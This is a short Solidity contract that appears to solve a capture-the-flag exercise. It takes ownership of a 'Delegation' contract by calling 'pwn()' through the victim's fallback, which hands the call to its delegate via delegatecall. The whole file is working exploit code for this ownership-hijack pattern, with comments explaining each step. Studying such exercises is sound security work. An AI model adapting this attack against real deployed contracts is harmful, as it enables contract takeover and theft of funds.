// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";
import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Just call function "pwn" with low level "call" function.
        // This will trigger fallback function of Delegation, which will trigger "pwn" function on Delegation's delegate.
        // Function "pwn" will then set the owner to the original caller (this contract);
        (bool success,) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        console.log("result of call to victim contract method pwn():", success);
    }
}
